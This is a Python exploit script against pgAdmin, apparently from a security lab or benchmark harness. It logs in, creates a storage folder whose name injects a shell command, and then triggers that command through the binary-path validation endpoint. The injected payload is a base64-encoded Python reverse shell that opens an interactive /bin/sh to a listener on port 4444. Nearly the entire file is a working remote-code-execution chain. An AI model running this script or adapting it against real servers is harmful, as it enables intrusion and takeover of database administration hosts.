#!/usr/bin/env python3
"""Create a crafted storage folder and execute a shell via pgAdmin."""

import base64
import http.cookiejar
import json
import os
import re
import urllib.parse
import urllib.request


ACCOUNT_EMAIL = "attacker@example.com"
ACCOUNT_PASSWORD = "pgadmin002-public"


def csrf_token(opener: urllib.request.OpenerDirector, target: str) -> str:
    response = opener.open(f"{target}/login", timeout=30)
    html = response.read().decode("utf-8", errors="replace")
    match = re.search(
        r"name=[\"']csrf_token[\"'][^>]*value=[\"']([^\"']+)", html,
    )
    if match is None:
        raise RuntimeError("login page has no CSRF token")
    return match.group(1)


def login(opener: urllib.request.OpenerDirector, target: str, token: str) -> None:
    form = urllib.parse.urlencode({
        "email": ACCOUNT_EMAIL,
        "password": ACCOUNT_PASSWORD,
        "csrf_token": token,
    }).encode()
    request = urllib.request.Request(
        f"{target}/authenticate/login",
        data=form,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    response = opener.open(request, timeout=30)
    response.read()
    if "/browser/" not in response.geturl():
        raise RuntimeError("pgAdmin login failed")


def api_headers(token: str) -> dict[str, str]:
    return {
        "Content-Type": "application/json",
        "X-CSRFToken": token,
        "X-pgA-CSRFToken": token,
    }


def post_json(
    opener: urllib.request.OpenerDirector, url: str,
    payload: dict[str, object], token: str,
) -> dict[str, object]:
    request = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        headers=api_headers(token),
        method="POST",
    )
    response = opener.open(request, timeout=60)
    document = json.loads(response.read())
    if response.status != 200 or document.get("success") != 1:
        raise RuntimeError(f"pgAdmin API rejected request: {document}")
    return document


def shell_directory_name() -> str:
    code = (
        "import os,socket;"
        "s=socket.socket();s.connect(('127.0.0.1',4444));"
        "[os.dup2(s.fileno(),i) for i in (0,1,2)];"
        "os.execl('/bin/sh','sh','-i')"
    )
    encoded = base64.b64encode(code.encode()).decode()
    return f'";python3 -c \'import base64;exec(base64.b64decode("{encoded}"))\';#'


def create_shell_directory(
    opener: urllib.request.OpenerDirector, target: str, token: str,
    name: str,
) -> str:
    document = post_json(
        opener,
        f"{target}/file_manager/get_trans_id",
        {"dialog_type": "storage_dialog", "supported_types": ["*"]},
        token,
    )
    transaction_id = document["data"]["fileTransId"]
    query = urllib.parse.urlencode({
        "mode": "addfolder", "path": "/", "name": name,
    })
    request = urllib.request.Request(
        f"{target}/file_manager/filemanager/{transaction_id}/?{query}",
        headers=api_headers(token),
    )
    response = opener.open(request, timeout=30)
    result = json.loads(response.read())["data"]["result"]
    if response.status != 200 or result.get("Code") != 1:
        raise RuntimeError(f"crafted storage directory was not created: {result}")
    return f"/var/lib/pgadmin/storage/attacker_example.com/{name}"


def trigger_exploit(
    opener: urllib.request.OpenerDirector, target: str,
    token: str, directory: str,
) -> None:
    response = post_json(
        opener,
        f"{target}/misc/validate_binary_path",
        {"utility_path": directory},
        token,
    )
    print(f"binary path validation accepted: {response['success']}", flush=True)


def main() -> None:
    target = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
    )
    token = csrf_token(opener, target)
    login(opener, target, token)
    directory = create_shell_directory(
        opener, target, token, shell_directory_name(),
    )
    trigger_exploit(opener, target, token, directory)
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
